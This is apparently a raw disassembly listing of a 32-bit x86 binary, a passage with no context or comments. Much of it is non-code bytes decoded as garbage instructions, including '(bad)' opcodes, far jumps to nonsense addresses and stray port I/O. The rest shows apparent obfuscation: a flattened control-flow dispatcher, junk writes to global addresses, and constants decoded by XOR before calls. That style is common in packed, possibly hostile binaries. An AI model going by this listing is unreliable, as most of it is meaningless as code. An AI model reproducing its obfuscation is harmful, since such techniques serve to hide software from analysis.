  40e167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e168:	jg     0x40e122
  40e16a:	test   al,0xaf
  40e16c:	stos   DWORD PTR es:[edi],eax
  40e16d:	mov    edx,0x3a0014b9
  40e172:	in     al,0xcf
  40e174:	and    al,0x1
  40e176:	pop    edi
  40e177:	ror    eax,cl
  40e179:	xchg   esp,eax
  40e17a:	jmp    0x40e102
  40e17c:	jmp    0xbe0a1c61
  40e181:	mov    gs,WORD PTR [ebx-0x53]
  40e184:	mov    ch,0x8b
  40e186:	cmp    eax,0xa6d55761
  40e18b:	inc    edx
  40e18c:	stos   BYTE PTR es:[edi],al
  40e18d:	test   BYTE PTR [ebx+esi*4+0x5],bl
  40e191:	xor    dl,dh
  40e193:	mov    ebx,0x7e728a1e
  40e198:	lods   eax,DWORD PTR ds:[esi]
  40e199:	jno    0x40e1ab
  40e19b:	in     eax,dx
  40e19c:	cmc    
  40e19d:	xchg   DWORD PTR [edx],eax
  40e19f:	add    al,0xec
  40e1a1:	pop    esp
  40e1a2:	and    edx,DWORD PTR ds:0x8f428285
  40e1a8:	inc    edx
  40e1a9:	fadd   st(6),st
  40e1ab:	mov    edi,0xd6fa5546
  40e1b0:	mov    edi,0x956b379c
  40e1b5:	and    BYTE PTR [edx],dh
  40e1b7:	rcl    DWORD PTR [ebx],1
  40e1b9:	cmp    al,0x43
  40e1bb:	aam    0x21
  40e1bd:	and    edi,DWORD PTR [eax-0x68c0319a]
  40e1c3:	add    al,0xc2
  40e1c5:	stc    
  40e1c6:	punpckhdq mm3,QWORD PTR [edx+0x13]
  40e1ca:	xchg   ebx,eax
  40e1cb:	addr16 jg 0x40e1d6
  40e1ce:	xor    eax,0x31594451
  40e1d3:	cli    
  40e1d4:	dec    ebp
  40e1d5:	cmp    ecx,DWORD PTR [edx+edi*8]
  40e1d8:	enter  0x8e7c,0xbf
  40e1dc:	xchg   DWORD PTR [esi+0x39],ebx
  40e1df:	dec    ebx
  40e1e0:	repz mov al,0x14
  40e1e3:	adc    DWORD PTR [edx],eax
  40e1e5:	arpl   WORD PTR [ecx+edx*4-0x14699a79],bx
  40e1ec:	loopne 0x40e1d5
  40e1ee:	cs aas 
  40e1f0:	jp     0x40e190
  40e1f2:	fbld   TBYTE PTR [edx-0xef54b7b]
  40e1f8:	push   esp
  40e1f9:	imul   esp,DWORD PTR [ebx-0x15],0x38
  40e1fd:	push   ss
  40e1fe:	or     eax,0x9e0e1c66
  40e203:	test   al,0x36
  40e205:	jp     0x40e20c
  40e207:	mov    edi,0xbeb86c3c
  40e20c:	jl     0x40e202
  40e20e:	cs mov ebx,0x72d49433
  40e214:	xor    DWORD PTR [ecx+0x1137cf36],0x5c
  40e21b:	pop    eax
  40e21c:	sub    eax,0x10e68269
  40e221:	es mov dl,0xca
  40e224:	mov    dl,0xdb
  40e226:	cmp    bl,ch
  40e228:	sub    al,0x22
  40e22a:	ret    0xac
  40e22d:	jns    0x40e1f6
  40e22f:	adc    eax,DWORD PTR [edi+0x2d2a7642]
  40e235:	loop   0x40e23f
  40e237:	add    eax,0x8ed0e21d
  40e23c:	jmp    0x40e1d4
  40e23e:	mov    BYTE PTR [ecx-0xb],cl
  40e241:	lahf   
  40e242:	mov    ds:0x4eb93e0,eax
  40e247:	or     ch,BYTE PTR [ecx-0x42]
  40e24a:	sub    al,0xda
  40e24c:	push   edx
  40e24d:	sub    cl,BYTE PTR [ebx-0x39de718d]
  40e253:	inc    ecx
  40e254:	jnp    0x40e253
  40e256:	sbb    ecx,DWORD PTR [esi-0x6f]
  40e259:	cli    
  40e25a:	lods   eax,DWORD PTR ds:[esi]
  40e25b:	sar    BYTE PTR [edx+0x4a],1
  40e25e:	not    BYTE PTR [ecx]
  40e260:	fsubr  QWORD PTR [edx+0x49]
  40e263:	pusha  
  40e264:	out    dx,al
  40e265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e266:	or     al,0x10
  40e268:	fadd   DWORD PTR [ebx+edx*8+0x5b]
  40e26c:	test   al,0x2c
  40e26e:	sahf   
  40e26f:	dec    esi
  40e270:	and    BYTE PTR [edi-0x24ef6f71],dh
  40e276:	cmp    ebx,DWORD PTR [edi+0x3c]
  40e279:	push   cs
  40e27a:	mov    eax,DWORD PTR [ebp-0x77]
  40e27d:	loopne 0x40e243
  40e27f:	push   edx
  40e280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e281:	or     BYTE PTR [ecx+0x7d8be845],0x8
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	(bad)  ds:0x98163886
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e422
  40e421:	mov    edx,0x1435a18e
  40e426:	or     al,0x66
  40e428:	jg     0x40e3af
  40e42a:	add    dl,BYTE PTR [ecx+0x4cfa0882]
  40e430:	pop    ebx
  40e431:	jbe    0x40e3e5
  40e433:	arpl   WORD PTR [ecx],cx
  40e435:	xchg   ebp,eax
  40e436:	jno    0x40e407
  40e438:	test   ebx,0xe7f476e4
  40e43e:	adc    dh,BYTE PTR [ebx]
  40e440:	das    
  40e441:	mov    al,ds:0x9db99eaf
  40e446:	push   ss
  40e447:	mov    ah,bl
  40e449:	ins    DWORD PTR es:[edi],dx
  40e44a:	mov    cl,0xe7
  40e44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e44d:	imul   eax,DWORD PTR [ebx+0x48b5904c],0xaf86dd90
  40e457:	add    bh,al
  40e459:	ss test al,0x17
  40e45c:	ins    BYTE PTR es:[edi],dx
  40e45d:	xor    eax,0x95c498c0
  40e462:	mov    bh,0x10
  40e464:	repz (bad) 
  40e466:	pop    ds
  40e467:	mov    ah,0x3d
  40e469:	jmp    0x40e482
  40e46b:	ret    
  40e46c:	das    
  40e46d:	mov    ecx,0x70417530
  40e472:	dec    esi
  40e473:	or     al,0x97
  40e476:	mov    dl,0x47
  40e478:	xchg   DWORD PTR [edx],esi
  40e47a:	imul   eax,DWORD PTR [eax-0x1f],0xffffff99
  40e47e:	and    eax,0x507baef1
  40e483:	xchg   esi,eax
  40e484:	dec    edx
  40e485:	mov    ecx,DWORD PTR [eax+0x35]
  40e488:	es pop ebp
  40e48a:	les    ecx,FWORD PTR [esi+edi*4]
  40e48d:	ret    
  40e48e:	and    BYTE PTR [ecx-0x17e02ae],ch
  40e494:	rol    BYTE PTR [edi],1
  40e496:	mov    ecx,DWORD PTR [ecx-0x47]
  40e499:	jmp    0x3c62:0xb11e1de3
  40e4a0:	mov    bl,0x69
  40e4a2:	push   esp
  40e4a3:	(bad)  
  40e4a4:	or     WORD PTR ss:[edx],cx
  40e4a8:	bound  ebp,QWORD PTR [esp+eax*4]
  40e4ab:	je     0x40e4ea
  40e4ad:	xor    edi,DWORD PTR [ebx-0x641a0868]
  40e4b3:	aaa    
  40e4b4:	jecxz  0x40e49c
  40e4b6:	gs jae 0x40e4b1
  40e4b9:	das    
  40e4ba:	nop
  40e4bb:	ins    DWORD PTR es:[edi],dx
  40e4bc:	pop    edx
  40e4bd:	addr16 fcmovnb st,st(3)
  40e4c0:	or     eax,0x4206ee4e
  40e4c5:	fidivr DWORD PTR [ecx]
  40e4c7:	push   edx
  40e4c8:	rcl    cl,cl
  40e4ca:	sahf   
  40e4cb:	pushf  
  40e4cc:	ins    BYTE PTR es:[edi],dx
  40e4cd:	into   
  40e4ce:	push   esi
  40e4cf:	outs   dx,BYTE PTR ds:[esi]
  40e4d0:	sbb    eax,esp
  40e4d2:	adc    al,0xee
  40e4d4:	pop    eax
  40e4d5:	dec    ebx
  40e4d6:	in     eax,0x78
  40e4d8:	and    DWORD PTR [esi],0xd5579158
  40e4de:	sub    ah,cl
  40e4e0:	and    al,0x94
  40e4e2:	push   edx
  40e4e3:	(bad)  
  40e4e4:	xor    al,0xb
  40e4e6:	test   BYTE PTR [edi],bh
  40e4e8:	ins    BYTE PTR es:[edi],dx
  40e4e9:	out    dx,al
  40e4ea:	xchg   ebp,eax
  40e4eb:	or     ah,bh
  40e4ed:	div    BYTE PTR [edx+0x10eb8c28]
  40e4f3:	push   eax
  40e4f4:	jmp    0x40e4f3
  40e4f6:	push   0xffffff83
  40e4f8:	retf   
  40e4f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4fa:	popa   
  40e4fb:	daa    
  40e4fc:	xor    esp,eax
  40e4fe:	arpl   WORD PTR [ecx-0x377a07d8],si
  40e504:	leave  
  40e505:	mov    ebx,0x2ff21d2
  40e50a:	pop    esi
  40e50b:	pop    ds
  40e50c:	or     dl,ch
  40e50e:	lods   al,BYTE PTR ds:[esi]
  40e50f:	push   ecx
  40e510:	jbe    0x40e587
  40e512:	sbb    DWORD PTR [ebp+0x36],ebp
  40e515:	xor    DWORD PTR [esi+eax*1],ebx
  40e518:	push   esp
  40e519:	mov    bl,BYTE PTR [ecx]
  40e51b:	mov    ebp,0xbeba78a9
  40e520:	or     ebp,DWORD PTR [edi]
  40e522:	sub    ebp,DWORD PTR [ebx]
  40e524:	sub    al,BYTE PTR [edi+ebx*1+0x77f49d01]
  40e52b:	and    BYTE PTR [edx],ah
  40e52d:	jne    0x40e557
  40e52f:	sub    al,ah
  40e531:	shl    edi,1
  40e533:	push   esp
  40e534:	mov    ebx,ecx
  40e536:	cld    
  40e537:	sub    eax,0xac8a9fc3
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xa0f261b8
  40e5b4:	iret   
  40e5b5:	hlt    
  40e5b6:	xor    ebp,DWORD PTR [edx]
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5ad
  40e5c0:	ss loope 0x40e5d4
  40e5c3:	sub    al,0xd1
  40e5c5:	pop    esp
  40e5c6:	loope  0x40e63e
  40e5c8:	enter  0xb43,0x63
  40e5cc:	repnz cmp edi,esp
  40e5cf:	mov    esp,0x744df303
  40e5d4:	add    ah,bl
  40e5d6:	cld    
  40e5d7:	(bad)  
  40e5d8:	(bad)  
  40e5d9:	dec    ebx
  40e5da:	cmp    eax,0x511f7fea
  40e5df:	xor    al,BYTE PTR [ebx-0x3a]
  40e5e2:	(bad)
  40e5e6:	add    DWORD PTR [edx+0x64],eax
  40e5e9:	fidiv  DWORD PTR [eax+eiz*1]
  40e5ec:	cli    
  40e5ed:	xchg   esp,eax
  40e5ee:	xchg   BYTE PTR [eax],dh
  40e5f0:	rcr    BYTE PTR [edi+0x42],0x46
  40e5f4:	xchg   esi,eax
  40e5f5:	dec    esi
  40e5f6:	mov    ds:0xe78fe3ee,al
  40e5fb:	dec    eax
  40e5fc:	leave  
  40e5fd:	push   esi
  40e5fe:	lods   eax,DWORD PTR ds:[esi]
  40e5ff:	fisub  WORD PTR [eax+0x4b]
  40e602:	fisubr DWORD PTR [edx+0x4efd525e]
  40e608:	xchg   esp,eax
  40e609:	cli    
  40e60a:	and    bl,BYTE PTR [edx-0x3c]
  40e60d:	sbb    eax,0x1c165e34
  40e612:	ds js  0x40e64f
  40e615:	mov    bl,BYTE PTR [ebx+0x57de054b]
  40e61b:	aam    0x44
  40e61d:	mov    BYTE PTR [ebx+0x3c],cl
  40e620:	jmp    0x6234df09
  40e625:	jb     0x40e674
  40e627:	les    esp,FWORD PTR [edi+0x3a]
  40e62a:	xchg   edi,eax
  40e62b:	ins    DWORD PTR es:[edi],dx
  40e62c:	ret    
  40e62d:	aaa    
  40e62e:	inc    eax
  40e62f:	or     DWORD PTR [edx+esi*2-0x18],esi
  40e633:	pop    ebx
  40e634:	rol    bl,1
  40e636:	mov    bh,0x64
  40e638:	jle    0x40e68a
  40e63a:	scas   eax,DWORD PTR es:[edi]
  40e63b:	cmp    BYTE PTR [ebp+0x1ef06fba],ch
  40e641:	int3   
  40e642:	jecxz  0x40e60b
  40e644:	test   al,0xe8
  40e646:	mov    ebx,0xe8fe3d11
  40e64b:	xchg   ecx,eax
  40e64c:	outs   dx,BYTE PTR ds:[esi]
  40e64d:	sbb    edi,DWORD PTR [edx+0x5dff774a]
  40e653:	inc    ecx
  40e654:	daa    
  40e655:	lock push es
  40e657:	inc    esi
  40e658:	nop
  40e659:	jo     0x40e6c5
  40e65b:	jl     0x40e6ca
  40e65d:	lods   al,BYTE PTR ds:[esi]
  40e65e:	ins    DWORD PTR es:[edi],dx
  40e65f:	and    BYTE PTR [edx-0x69d0a170],0xa8
  40e666:	pusha  
  40e667:	add    ch,BYTE PTR [ecx-0x3d]
  40e66a:	mov    ch,0x95
  40e66c:	push   esp
  40e66d:	xlat   BYTE PTR ds:[ebx]
  40e66e:	(bad)  
  40e66f:	aas    
  40e670:	pop    ds
  40e671:	sbb    DWORD PTR ds:0xdbd83dc9,esi
  40e677:	imul   esp,DWORD PTR [ebx-0x6259140b],0x3e
  40e67e:	daa    
  40e67f:	add    edx,eax
  40e681:	push   ebp
  40e682:	mov    BYTE PTR [edi+0x2],ch
  40e685:	scas   al,BYTE PTR es:[edi]
  40e686:	test   eax,0x20f5f10e
  40e68b:	call   0x943f8869
  40e690:	push   0xf1d4d9fb
  40e695:	pop    ebp
  40e696:	in     al,0xd7
  40e698:	or     BYTE PTR [ecx],ch
  40e69a:	out    0xe5,al
  40e69c:	aad    0x58
  40e69e:	pop    ebx
  40e69f:	lea    esi,[edi+0x2a]
  40e6a2:	mov    WORD PTR [eax+0x5d29b966],fs
  40e6a8:	mov    dl,cl
  40e6aa:	popf   
  40e6ab:	pop    edx
  40e6ac:	mov    ebp,0xde075e9d
  40e6b1:	mov    ebp,0x6357855e
  40e6b6:	mov    cl,0xe9
  40e6b8:	loopne 0x40e697
  40e6ba:	adc    ebx,DWORD PTR [eax]
  40e6bc:	ret    0x7cdb
  40e6bf:	ds inc ebx
  40e6c1:	cmp    dh,bl
  40e6c3:	jb     0x40e699
  40e6c5:	std    
  40e6c6:	sub    eax,0x5339da5e
  40e6cb:	pop    esi
  40e6cc:	loopne 0x40e6f1
  40e6ce:	jmp    0x52ab:0x1f925150
  40e6d5:	stos   DWORD PTR es:[edi],eax
  40e6d6:	adc    esp,esi
  40e6d8:	sbb    BYTE PTR [eax],bl
  40e6da:	mul    BYTE PTR [ecx+0x413b34]
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x319149ba]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e770
  40e704:	xor    eax,DWORD PTR [esi+0x18e9917c]
  40e70a:	sub    eax,0xf0daf447
  40e70f:	nop
  40e710:	mov    ecx,0x4966fbf4
  40e715:	aaa    
  40e716:	mov    eax,0x48f26491
  40e71b:	mov    ah,0xa3
  40e71d:	mov    ch,0x70
  40e71f:	jb     0x40e6c9
  40e721:	test   BYTE PTR [esi],0xc
  40e724:	mov    cl,0x9a
  40e726:	fnstcw WORD PTR [eax-0x17]
  40e729:	add    al,0xf3
  40e72b:	or     al,0x7
  40e72d:	les    eax,FWORD PTR [eax+0x5f]
  40e730:	jae    0x40e714
  40e732:	call   0x1d35b359
  40e737:	ja     0x40e747
  40e739:	jbe    0x40e765
  40e73b:	jge    0x40e705
  40e73d:	iret   
  40e73e:	mov    ds:0xddbb838b,eax
  40e743:	xchg   edx,eax
  40e744:	test   eax,ecx
  40e746:	dec    esi
  40e747:	nop
  40e748:	dec    edx
  40e749:	inc    eax
  40e74a:	sub    DWORD PTR [ecx-0x1f669e35],edx
  40e750:	and    DWORD PTR [edi],edx
  40e752:	and    cl,BYTE PTR [ebp-0x29a069f0]
  40e758:	jge    0x40e757
  40e75a:	lods   eax,DWORD PTR ds:[esi]
  40e75b:	push   esp
  40e75c:	iret   
  40e75d:	dec    DWORD PTR [edx-0x5f6f16e5]
  40e763:	inc    esi
  40e764:	cmp    al,cl
  40e766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e767:	add    al,0xa0
  40e769:	ds in  eax,0x4a
  40e76c:	in     al,0x5f
  40e76e:	mov    cl,0x5c
  40e770:	add    BYTE PTR [edx],bl
  40e772:	iret   
  40e773:	xchg   esi,eax
  40e774:	and    BYTE PTR fs:[edx+ebx*2+0x39b46ec5],0x6a
  40e77d:	push   ecx
  40e77e:	sbb    BYTE PTR [edx-0x19],al
  40e781:	lds    edi,FWORD PTR [ecx-0x250c151c]
  40e787:	ins    DWORD PTR es:[edi],dx
  40e788:	push   es
  40e789:	xor    eax,0xad44d79b
  40e78e:	call   0x1994:0xe6954b37
  40e795:	push   eax
  40e796:	(bad)  
  40e798:	add    BYTE PTR [edx],dl
  40e79a:	mov    ds:0x2baa1add,eax
  40e79f:	stos   DWORD PTR es:[edi],eax
  40e7a0:	inc    esp
  40e7a1:	cmc    
  40e7a2:	mov    ch,0xb4
  40e7a4:	inc    esi
  40e7a5:	sub    ebx,eax
  40e7a7:	das    
  40e7a8:	mov    esi,0x4b96560e
  40e7ad:	bound  edi,QWORD PTR [eax-0x4b]
  40e7b0:	dec    edi
  40e7b1:	pop    eax
  40e7b2:	nop
  40e7b3:	adc    bl,dl
  40e7b5:	adc    eax,0x22f09b2d
  40e7ba:	mov    ah,0xd5
  40e7bc:	stos   BYTE PTR es:[edi],al
  40e7bd:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40e7bf:	mov    esp,0x331eaa66
  40e7c4:	push   esi
  40e7c5:	ret    0x7e39
  40e7c8:	idiv   DWORD PTR [ebp+0x9ca584a]
  40e7ce:	fs out dx,al
  40e7d0:	adc    ecx,DWORD PTR [ecx+ecx*2]
  40e7d3:	out    dx,al
  40e7d4:	not    DWORD PTR [esi+eiz*4-0x6ad6140d]
  40e7db:	repnz nop
  40e7dd:	xor    al,0xab
  40e7df:	push   esi
  40e7e0:	dec    ebx
  40e7e1:	es xor eax,0xf3d6d535
  40e7e7:	out    dx,eax
  40e7e8:	or     eax,DWORD PTR [ecx]
  40e7ea:	dec    ecx
  40e7eb:	nop
  40e7ec:	jmp    0xdbd6:0x8dc8941e
  40e7f3:	sar    edx,0x24
  40e7f6:	ret    
  40e7f7:	sbb    DWORD PTR [ecx],edx
  40e7f9:	int3   
  40e7fa:	fstp   TBYTE PTR [edi-0x1acb5278]
  40e800:	sub    bh,BYTE PTR [esi+edi*4-0x68]
  40e804:	and    eax,0x676ad20d
  40e809:	xchg   edi,eax
  40e80a:	xor    edi,DWORD PTR [edi]
  40e80c:	scas   al,BYTE PTR es:[edi]
  40e80d:	push   ecx
  40e80e:	push   cs
  40e80f:	js     0x40e84a
  40e811:	ret    0xec40
  40e814:	pop    eax
  40e815:	push   ebp
  40e816:	dec    ecx
  40e817:	inc    esi
  40e818:	imul   ebx,DWORD PTR ss:[ebx+0x2508fdd6],0x8bfc4589
  40e823:	inc    ebp
  40e824:	cld    
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8a0
  40e854:	imul   edi
  40e856:	fsubrp st(2),st
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8b2
  40e860:	and    al,0x9
  40e862:	test   DWORD PTR [ebp+0x1fced734],0xc9b5bff
  40e86c:	or     BYTE PTR [ebx+0x4f3f40c3],bl
  40e872:	add    ebx,ebx
  40e874:	sbb    esp,DWORD PTR [ebp+0x3cb280a2]
  40e87a:	loopne 0x40e8d3
  40e87c:	fcomp  DWORD PTR [edi]
  40e87e:	outs   dx,BYTE PTR ds:[esi]
  40e87f:	cmp    al,BYTE PTR [esi+0x76708c77]
  40e885:	arpl   WORD PTR [edx+esi*8+0x29],si
  40e889:	jo     0x40e86b
  40e88b:	ds pushf 
  40e88d:	jb     0x40e8f3
  40e88f:	in     eax,0xfd
  40e891:	aas    
  40e892:	xchg   esp,eax
  40e893:	mov    edx,0xdae65ff6
  40e898:	ja     0x40e876
  40e89a:	mov    ds:0x8ba190e2,eax
  40e89f:	loopne 0x40e8ef
  40e8a1:	adc    DWORD PTR [ebp+0x34e7f0f5],ecx
  40e8a7:	add    cl,BYTE PTR [eax+0x64]
  40e8aa:	jo     0x40e919
  40e8ac:	fistp  QWORD PTR [ecx-0x2ece6703]
  40e8b2:	and    al,0x29
  40e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8b7:	jmp    0x40e8de
  40e8b9:	nop
  40e8ba:	cmp    al,BYTE PTR [ecx+0x756393ba]
  40e8c0:	add    DWORD PTR [ebx+edx*4],esp
  40e8c3:	push   0x6ed4ee4b
  40e8c8:	xchg   edx,eax
  40e8c9:	sbb    dh,BYTE PTR [ebx+esi*2-0x19]
  40e8cd:	sti    
  40e8ce:	loope  0x40e8b5
  40e8d0:	jns    0x40e89c
  40e8d2:	sbb    eax,0x1519411d
  40e8d7:	adc    BYTE PTR [edx],0x50
  40e8da:	add    DWORD PTR [ebp+0x61],ecx
  40e8dd:	in     al,dx
  40e8de:	rcl    ch,0xb8
  40e8e1:	dec    eax
  40e8e2:	pusha  
  40e8e3:	fmul   st(1),st
  40e8e5:	xchg   ebx,eax
  40e8e6:	jmp    0xcf8d:0x1c0731f
  40e8ed:	clc    
  40e8ee:	push   cs
  40e8ef:	lsl    ecx,sp
  40e8f2:	sbb    dh,BYTE PTR [edi+edi*4]
  40e8f5:	scas   eax,DWORD PTR es:[edi]
  40e8f6:	(bad)  
  40e8f7:	pop    eax
  40e8f8:	sub    al,0x28
  40e8fa:	push   cs
  40e8fb:	loope  0x40e971
  40e8fd:	sbb    dl,dl
  40e8ff:	sub    al,0x81
  40e901:	pop    ecx
  40e902:	push   esi
  40e903:	lds    esi,FWORD PTR [esi]
  40e905:	es jnp 0x40e8d2
  40e908:	ss sub al,0xbe
  40e90b:	jns    0x40e93c
  40e90d:	mov    dh,0xb2
  40e90f:	(bad)  
  40e910:	call   0xb473:0xd07547cc
  40e917:	mov    bh,0xb
  40e919:	test   al,0x7c
  40e91b:	mov    al,ds:0xf640d098
  40e920:	outs   dx,BYTE PTR ds:[esi]
  40e921:	sbb    al,ah
  40e923:	and    dh,BYTE PTR [eax]
  40e925:	fistp  QWORD PTR [esi-0x4581565b]
  40e92b:	lods   eax,DWORD PTR ds:[esi]
  40e92c:	push   ds
  40e92d:	(bad)  
  40e92f:	pop    edx
  40e930:	inc    edi
  40e931:	pop    ebx
  40e932:	jb     0xa9278f57
  40e938:	dec    edi
  40e939:	mov    cs:0xc07be602,eax
  40e93f:	cmpxchg DWORD PTR [edx+0x547aa64a],edx
  40e946:	adc    eax,0xe026483
  40e94b:	lods   al,BYTE PTR ds:[esi]
  40e94c:	arpl   WORD PTR [eax],dx
  40e94e:	(bad)  
  40e94f:	cli    
  40e950:	mov    edi,0x52be44b
  40e955:	xor    BYTE PTR [ebp-0x7f9a4c12],dl
  40e95b:	jmp    0x1259a71a
  40e960:	mul    BYTE PTR [esi-0x6386411e]
  40e966:	mov    al,ds:0x97e82a74
  40e96b:	ficom  DWORD PTR [eax+0x42c9940a]
  40e971:	dec    esp
  40e972:	aam    0xf9
  40e974:	sbb    BYTE PTR [eax-0xc7d8c8f],dl
  40e97a:	sub    BYTE PTR [edi],cl
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xf03dcc1d
  40e99c:	cmp    al,BYTE PTR [esi+0x127e7ea4]
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e94c
  40e9a6:	mov    edi,esi
  40e9a8:	dec    ebp
